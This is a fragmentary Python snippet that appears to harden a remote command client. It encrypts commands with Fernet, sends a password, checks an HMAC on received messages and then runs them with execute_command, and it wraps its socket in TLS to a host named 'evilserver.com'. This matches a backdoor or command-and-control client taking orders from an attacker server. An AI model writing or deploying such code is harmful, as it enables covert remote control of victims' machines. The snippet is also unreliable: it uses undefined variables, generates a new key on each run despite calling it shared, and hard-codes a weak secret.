from cryptography.fernet import Fernet
import hmac
import hashlib
import ssl

# Shared secret (different from encryption key!)
hmac_secret = b"supersecret123"


# Generate a key (do this once and share it between client/server)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt a command
encrypted_command = cipher.encrypt(b"ls -la")

# Decrypt a command
decrypted_command = cipher.decrypt(encrypted_command)


# Client sends password immediately after connecting
password = input("Enter password: ")
client.send(password.encode())
response = client.recv(1024).decode()
if "granted" not in response:
    exit()
    
# Client: Verify HMAC before executing
received_data = client.recv(4096)
message, received_digest = received_data.split(b"|")
expected_digest = hmac.new(hmac_secret, message, hashlib.sha256).hexdigest()

if received_digest.decode() != expected_digest:
    print("Tampering detected!")
else:
    execute_command(message)
    
    
context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.load_verify_locations("cert.pem")

secure_client = context.wrap_socket(client_socket, server_hostname="evilserver.com")